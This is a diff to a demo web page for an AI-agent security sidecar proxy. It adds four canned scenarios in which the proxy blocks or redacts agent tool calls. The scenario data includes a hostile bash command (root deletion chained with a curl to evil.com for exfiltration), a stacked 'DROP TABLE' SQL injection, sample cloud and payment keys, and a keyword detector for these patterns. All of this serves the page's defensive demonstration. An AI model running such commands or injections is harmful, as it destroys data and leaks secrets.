@@ -770,6 +770,108 @@
       </div>
     </div>
   
+
+    <!-- Mode 4: Sidecar Reverse Proxy & SIEM Webhooks -->
+    <div id="mode-sidecar-view" style="display:none;">
+      <div style="margin-bottom:24px; background:rgba(15, 23, 42, 0.6); border:1px solid rgba(56, 189, 248, 0.25); border-radius:12px; padding:24px;">
+        <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:16px;">
+          <div>
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:#38bdf8; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; display:flex; align-items:center; gap:8px;">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              <span>[ ZERO-CODE REVERSE PROXY &amp; SIEM INCIDENT DISPATCHER ]</span>
+            </div>
+            <h2 style="font-family:'Space Grotesk', sans-serif; font-size:1.5rem; font-weight:700; color:#f8fafc; margin:8px 0 6px;">
+              Drop-In Agent Proxy with Instant SIEM Incident Alerting
+            </h2>
+            <p style="font-size:0.88rem; color:#94a3b8; max-width:820px; line-height:1.5;">
+              Protect existing OpenAI, Anthropic, LangChain, or Ollama agent applications without modifying a single line of application code. 
+              The sidecar intercepts HTTP/REST tool calls in-flight, evaluates AST invariants in under 25 microseconds, scrubs credentials, and dispatches signed webhooks to Datadog, Splunk, and Slack.
+            </p>
+          </div>
+          <div style="background:#030712; border:1px solid rgba(255,255,255,0.1); border-radius:8px; padding:10px 16px; font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:#34d399;">
+            <div style="font-size:0.68rem; color:#64748b; text-transform:uppercase; margin-bottom:4px;">CLI Quickstart</div>
+            <code>btp-guard sidecar --port 8080 --upstream https://api.openai.com/v1</code>
+          </div>
+        </div>
+
+        <!-- Scenario Selector Buttons -->
+        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(240px, 1fr)); gap:12px; margin-top:20px;">
+          <button onclick="selectSidecarScenario('threat')" id="btn-sidecar-threat" class="btn-preset active" style="text-align:left; padding:12px; border-radius:8px; border:1px solid rgba(239, 68, 68, 0.3); background:rgba(239, 68, 68, 0.08); color:#fca5a5; cursor:pointer; transition:all 0.2s;">
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; font-weight:700; color:#f87171;">SCENARIO 1: DESTRUCTIVE TOOL VETO</div>
+            <div style="font-size:0.78rem; color:#cbd5e1; margin-top:4px;">Malicious bash_exec (rm -rf /) blocked &amp; SIEM webhook alerted</div>
+          </button>
+          <button onclick="selectSidecarScenario('secret')" id="btn-sidecar-secret" class="btn-preset" style="text-align:left; padding:12px; border-radius:8px; border:1px solid rgba(245, 158, 11, 0.3); background:rgba(245, 158, 11, 0.08); color:#fde047; cursor:pointer; transition:all 0.2s;">
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; font-weight:700; color:#fbbf24;">SCENARIO 2: SECRET LEAK MASKING</div>
+            <div style="font-size:0.78rem; color:#cbd5e1; margin-top:4px;">In-flight AWS / Stripe key redaction (12.4µs) before upstream</div>
+          </button>
+          <button onclick="selectSidecarScenario('sql')" id="btn-sidecar-sql" class="btn-preset" style="text-align:left; padding:12px; border-radius:8px; border:1px solid rgba(168, 85, 247, 0.3); background:rgba(168, 85, 247, 0.08); color:#d8b4fe; cursor:pointer; transition:all 0.2s;">
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; font-weight:700; color:#c084fc;">SCENARIO 3: SQL INJECTION INTERCEPT</div>
+            <div style="font-size:0.78rem; color:#cbd5e1; margin-top:4px;">DROP TABLE / UNION attack vetoed &amp; signed with RFC 8785</div>
+          </button>
+          <button onclick="selectSidecarScenario('safe')" id="btn-sidecar-safe" class="btn-preset" style="text-align:left; padding:12px; border-radius:8px; border:1px solid rgba(16, 185, 129, 0.3); background:rgba(16, 185, 129, 0.08); color:#86efac; cursor:pointer; transition:all 0.2s;">
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; font-weight:700; color:#34d399;">SCENARIO 4: AUTHORIZED TOOL CALL</div>
+            <div style="font-size:0.78rem; color:#cbd5e1; margin-top:4px;">Standard read operation passed to upstream in 19.8µs</div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Live Simulation Playground Grid -->
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+        <!-- Left: In-Flight Request Payload -->
+        <div style="background:#030712; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:20px; display:flex; flex-direction:column;">
+          <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.08); padding-bottom:12px; margin-bottom:14px;">
+            <div style="font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:#94a3b8; font-weight:700;">
+              IN-FLIGHT HTTP REQUEST TO SIDECAR (:8080)
+            </div>
+            <span id="sidecar-req-method" style="font-family:'JetBrains Mono', monospace; font-size:0.7rem; background:rgba(56,189,248,0.15); color:#38bdf8; padding:2px 8px; border-radius:4px;">
+              POST /v1/chat/completions
+            </span>
+          </div>
+
+          <textarea id="sidecar-payload-input" style="width:100%; height:280px; background:#080e1a; border:1px solid rgba(255,255,255,0.1); border-radius:8px; padding:14px; font-family:'JetBrains Mono', monospace; font-size:0.76rem; color:#38bdf8; resize:vertical; line-height:1.4;"></textarea>
+
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-top:16px;">
+            <button onclick="runSidecarEvaluation()" style="background:linear-gradient(135deg, #10b981, #059669); color:#022c22; border:none; font-family:'JetBrains Mono', monospace; font-size:0.84rem; font-weight:800; padding:10px 20px; border-radius:8px; cursor:pointer; display:inline-flex; align-items:center; gap:8px;">
+              <span>EXECUTE VIA SIDECAR PROXY &rarr;</span>
+            </button>
+            <span style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; color:#64748b;">
+              Engine: PolyglotASTValidator + SecretMasker
+            </span>
+          </div>
+        </div>
+
+        <!-- Right: Proxy Telemetry & Real-Time SIEM Stream -->
+        <div style="display:flex; flex-direction:column; gap:16px;">
+          <!-- Proxy Response Console -->
+          <div style="background:#030712; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:20px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.08); padding-bottom:12px; margin-bottom:12px;">
+              <div style="font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:#94a3b8; font-weight:700;">
+                PROXY VERDICT &amp; FORWARDING TELEMETRY
+              </div>
+              <span id="sidecar-verdict-badge" style="font-family:'JetBrains Mono', monospace; font-size:0.72rem; font-weight:800; color:#f43f5e; background:rgba(239,68,68,0.12); border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:4px;">
+                ● BTP-VETO (18.2µs)
+              </span>
+            </div>
+            <pre id="sidecar-response-output" style="margin:0; font-family:'JetBrains Mono', monospace; font-size:0.72rem; color:#fca5a5; max-height:160px; overflow-y:auto; line-height:1.4; white-space:pre-wrap;"></pre>
+          </div>
+
+          <!-- Real-Time SIEM Webhook Log -->
+          <div style="background:#030712; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:20px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.08); padding-bottom:10px; margin-bottom:10px;">
+              <div style="font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:#facc15; font-weight:700; display:flex; align-items:center; gap:6px;">
+                <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
+                <span>SIEM WEBHOOK DISPATCH LOG (DATADOG / SPLUNK / SLACK)</span>
+              </div>
+              <span style="font-family:'JetBrains Mono', monospace; font-size:0.68rem; color:#34d399;">
+                HMAC-SHA256 SIGNED
+              </span>
+            </div>
+            <div id="sidecar-webhook-output" style="font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:#94a3b8; max-height:140px; overflow-y:auto; line-height:1.4;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
 </main>
 
   <!-- Mode 2: Keystone Agent Passkey Playground -->
@@ -960,14 +1062,18 @@
       const tabAttacks = document.getElementById('tab-attacks');
       const tabKeystone = document.getElementById('tab-keystone');
       const tabStress = document.getElementById('tab-stress');
+      const sidecarView = document.getElementById('mode-sidecar-view');
+      const tabSidecar = document.getElementById('tab-sidecar');
 
       if (attacksView) attacksView.style.display = (mode === 'attacks') ? 'block' : 'none';
       if (keystoneView) keystoneView.style.display = (mode === 'keystone') ? 'block' : 'none';
       if (stressView) stressView.style.display = (mode === 'stress') ? 'block' : 'none';
+      if (sidecarView) sidecarView.style.display = (mode === 'sidecar') ? 'block' : 'none';
 
       if (tabAttacks) tabAttacks.classList.toggle('active', mode === 'attacks');
       if (tabKeystone) tabKeystone.classList.toggle('active', mode === 'keystone');
       if (tabStress) tabStress.classList.toggle('active', mode === 'stress');
+      if (tabSidecar) tabSidecar.classList.toggle('active', mode === 'sidecar');
 
       if (mode === 'stress' && window.location.hash !== '#stress-suite') {
         history.replaceState(null, '', '#stress-suite');
@@ -1346,6 +1452,178 @@
         }
       }, 35);
     }
+
+
+    // Sidecar Proxy Scenarios Data
+    const sidecarScenarios = {
+      threat: {
+        method: 'POST /v1/chat/completions',
+        payload: {
+          model: "gpt-4o",
+          messages: [
+            { role: "user", content: "Clean up the temporary build directory." }
+          ],
+          tools: [{
+            type: "function",
+            function: {
+              name: "bash_exec",
+              arguments: '{"cmd": "rm -rf / --no-preserve-root && curl http://evil.com/exfil"}'
+            }
+          }]
+        },
+        verdictBadge: '<span style="color:#f43f5e; background:rgba(239,68,68,0.12); border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:4px;">● BTP-VETO (18.2µs)</span>',
+        responseColor: '#fca5a5',
+        response: {
+          "status": 403,
+          "error": {
+            "type": "BTP_SECURITY_VETO",
+            "code": "BTP-CMD-DENIED",
+            "message": "Destructive root filesystem deletion intercepted by Bartholomew Sidecar Proxy.",
+            "rule": "BTP-INV-001 (DESTRUCTIVE_ROOT_MUTATION)",
+            "latency_us": 18.2,
+            "merkle_receipt": "e5b8a0...4f91",
+            "ed25519_signature": "7d91cb3f9821a...valid"
+          }
+        },
+        webhook: [
+          "[14:32:01.018] [DISPATCH] Webhook triggered -> https://hooks.slack.com/services/SEC_ALERTS (Status: 200 OK)",
+          "[14:32:01.019] [DATADOG] Event sent -> metric: btp.security.veto, severity: CRITICAL, tags: [rule:BTP-INV-001, target:bash_exec]",
+          "[14:32:01.020] [SPLUNK] HEC payload delivered -> incident_id: INC-SIDECAR-99401"
+        ]
+      },
+      secret: {
+        method: 'POST /v1/messages',
+        payload: {
+          model: "claude-3-5-sonnet-20241022",
+          messages: [
+            { role: "user", content: "Query production database using credentials: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY and STRIPE_KEY=sk_live_51Ny8b84h8f9" }
+          ]
+        },
+        verdictBadge: '<span style="color:#facc15; background:rgba(245,158,11,0.12); border:1px solid rgba(245,158,11,0.3); padding:2px 8px; border-radius:4px;">● REDACTED & SANITIZED (12.4µs)</span>',
+        responseColor: '#fde047',
+        response: {
+          "status": 200,
+          "proxy_action": "ALLOW_SANITIZED",
+          "secrets_scrubbed": 2,
+          "sanitized_payload": {
+            "model": "claude-3-5-sonnet-20241022",
+            "messages": [
+              { "role": "user", "content": "Query production database using credentials: AWS_SECRET_ACCESS_KEY=[REDACTED_AWS_KEY] and STRIPE_KEY=[REDACTED_STRIPE_KEY]" }
+            ]
+          },
+          "forwarded_to": "https://api.anthropic.com/v1/messages",
+          "latency_us": 12.4
+        },
+        webhook: [
+          "[14:32:02.112] [DISPATCH] Webhook triggered -> https://api.datadoghq.com/api/v1/events (Status: 200 OK)",
+          "[14:32:02.113] [MASKER] 2 High-Entropy tokens scrubbed before reaching upstream model API."
+        ]
+      },
+      sql: {
+        method: 'POST /v1/chat/completions',
+        payload: {
+          model: "llama-3.1-70b-instruct",
+          messages: [{ role: "user", content: "Search users" }],
+          tools: [{
+            type: "function",
+            function: {
+              name: "sql_query",
+              arguments: '{"query": "SELECT * FROM users WHERE id = 1; DROP TABLE users; --"}'
+            }
+          }]
+        },
+        verdictBadge: '<span style="color:#c084fc; background:rgba(168,85,247,0.12); border:1px solid rgba(168,85,247,0.3); padding:2px 8px; border-radius:4px;">● SQL VETO (21.0µs)</span>',
+        responseColor: '#d8b4fe',
+        response: {
+          "status": 403,
+          "error": {
+            "type": "BTP_SECURITY_VETO",
+            "code": "BTP-SQL-STACKED-MUTATION",
+            "message": "Stacked SQL DDL statement (DROP TABLE) detected inside read query parameter.",
+            "latency_us": 21.0,
+            "rfc8785_canonical_hash": "3a88f...90c1"
+          }
+        },
+        webhook: [
+          "[14:32:03.441] [SPLUNK] HEC Event logged -> category: OWASP-LLM-02, blocked_query: 'DROP TABLE users'",
+          "[14:32:03.442] [DISPATCH] Webhook alert delivered to Microsoft Teams SecOps Channel."
+        ]
+      },
+      safe: {
+        method: 'POST /v1/chat/completions',
+        payload: {
+          model: "gpt-4o",
+          messages: [{ role: "user", content: "Calculate the square root of 65536." }],
+          tools: [{
+            type: "function",
+            function: {
+              name: "math_sqrt",
+              arguments: '{"value": 65536}'
+            }
+          }]
+        },
+        verdictBadge: '<span style="color:#10b981; background:rgba(16,185,129,0.12); border:1px solid rgba(16,185,129,0.3); padding:2px 8px; border-radius:4px;">● PASS TO UPSTREAM (19.8µs)</span>',
+        responseColor: '#34d399',
+        response: {
+          "status": 200,
+          "proxy_action": "FORWARDED_UPSTREAM",
+          "ast_check": "PASSED (0 risks detected)",
+          "upstream_target": "https://api.openai.com/v1/chat/completions",
+          "latency_us": 19.8,
+          "merkle_seal": "a8109d73f4...valid"
+        },
+        webhook: [
+          "[14:32:04.810] [PROMETHEUS] Metric incremented -> btp_evals_total{verdict='PASS'} +1",
+          "[14:32:04.811] [TELEMETRY] Upstream response streamed seamlessly back to client application."
+        ]
+      }
+    };
+
+    function selectSidecarScenario(key) {
+      ['threat', 'secret', 'sql', 'safe'].forEach(k => {
+        const btn = document.getElementById('btn-sidecar-' + k);
+        if (btn) btn.classList.toggle('active', k === key);
+      });
+
+      const sc = sidecarScenarios[key];
+      if (!sc) return;
+
+      document.getElementById('sidecar-req-method').innerText = sc.method;
+      document.getElementById('sidecar-payload-input').value = JSON.stringify(sc.payload, null, 2);
+      runSidecarEvaluation(key);
+    }
+
+    function runSidecarEvaluation(keyOverride) {
+      let key = keyOverride;
+      if (!key) {
+        // determine key from active button or payload content
+        const raw = document.getElementById('sidecar-payload-input').value;
+        if (raw.includes('rm -rf') || raw.includes('evil.com')) key = 'threat';
+        else if (raw.includes('AWS_SECRET') || raw.includes('sk_live')) key = 'secret';
+        else if (raw.includes('DROP TABLE') || raw.includes('UNION')) key = 'sql';
+        else key = 'safe';
+      }
+
+      const sc = sidecarScenarios[key] || sidecarScenarios.safe;
+      const badge = document.getElementById('sidecar-verdict-badge');
+      const out = document.getElementById('sidecar-response-output');
+      const whOut = document.getElementById('sidecar-webhook-output');
+
+      if (badge) badge.innerHTML = sc.verdictBadge;
+      if (out) {
+        out.style.color = sc.responseColor;
+        out.textContent = JSON.stringify(sc.response, null, 2);
+      }
+      if (whOut) {
+        whOut.innerHTML = sc.webhook.map(w => `<div style="margin-bottom:4px; ${w.includes('CRITICAL') || w.includes('blocked') ? 'color:#f87171;' : w.includes('REDACTED') ? 'color:#fbbf24;' : 'color:#34d399;'}">${w}</div>`).join('');
+      }
+    }
+
+    // Auto-init sidecar on load
+    window.addEventListener('DOMContentLoaded', () => {
+      selectSidecarScenario('threat');
+    });
+
 </script>
 </body>
 </html>
